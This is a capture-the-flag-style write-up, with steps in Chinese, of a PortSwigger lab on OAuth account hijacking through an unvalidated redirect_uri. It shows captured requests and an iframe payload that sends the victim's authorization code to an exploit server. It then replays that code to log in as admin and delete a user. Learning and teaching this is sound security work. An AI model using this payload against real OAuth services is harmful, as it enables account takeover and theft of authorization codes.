[Write Up]Lab: OAuth account hijacking via redirect_uri

2024-12-18
#write-up  #portswigger  #oauth 

Lab description#

Solution#

  1. 点击右上方My account时，出现以下跳转Request

    GET /auth?client_id=gxen32ezy00to1ap50mge&redirect_uri=https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ab80053042f8581896b84f602af00b3.oauth-server.net

    HTTP/2 302 Found

Redirecting to <a href="https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm">https://0ad000120492857c89e286a900a20099.web-security-academy.net/oauth-callback?code=qLYTUERIKmhJKEWvrGoX0YpedGklu7xwprAu1kDGrcm</a>.

    GET /oauth-callback?code=W0PvtZoskGkaeRQIhUQpW6VA1KdILePu-AKvvNbGp9S HTTP/2
Host: 0ad000120492857c89e286a900a20099.web-security-academy.net

    HTTP/2 200 OK

  2. 点击最上方Go to exploit server并构造格式为<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>的body，点击Store、Deliver exploit to victim

  3. 点击Access log

  4. 重放/oauth-callback?code=，并将code换成Access log内所截获的任一/exploit?code=

    GET /oauth-callback?code=xdtSFD0NoksZKpY4ZsGwhK9HELhgQXLHd8juEW9OE5K HTTP/2
Host: 0ad000120492857c89e286a900a20099.web-security-academy.net

  5. 登录后为Admin

  6. 点击右上角Admin panel后点击carlos - Delete即可解题
